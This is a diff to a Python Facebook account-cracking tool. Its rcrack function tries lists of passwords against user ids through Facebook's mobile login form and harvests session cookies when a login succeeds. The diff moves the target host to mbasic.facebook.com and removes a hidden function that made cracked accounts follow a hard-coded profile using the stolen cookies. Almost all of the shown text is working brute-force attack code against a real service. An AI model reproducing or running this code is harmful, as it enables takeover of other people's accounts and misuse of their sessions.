@@ -46,14 +46,7 @@ def cek_apk(session,coki):
         else:
             print('')
  
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://mbasic.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
-            
-          
+
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
@@ -91,7 +84,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://www.facebook.com/Riddu999')
+os.system('xdg-open https://facebook.com/groups/3139195683051353/')
 logo = ("""\033[1;92m
 \t███    ███ ███████ ████████  █████  
 \t████  ████ ██         ██    ██   ██ 
@@ -224,7 +217,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -235,14 +228,14 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
 			'method': 'GET',
-			'path': 'https://free.facebook.com/?_rdc=1&_rdr',
+			'path': 'https://mbasic.facebook.com/?_rdc=1&_rdr',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 			'accept-encoding': 'gzip, deflate, br',
 			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://free.facebook.com/',
+			'referer': 'https://mbasic.facebook.com/',
 			'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
 			'sec-ch-ua-mobile': '?0',
 			'sec-ch-ua-platform': '"Windows"',
@@ -251,7 +244,7 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro,}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
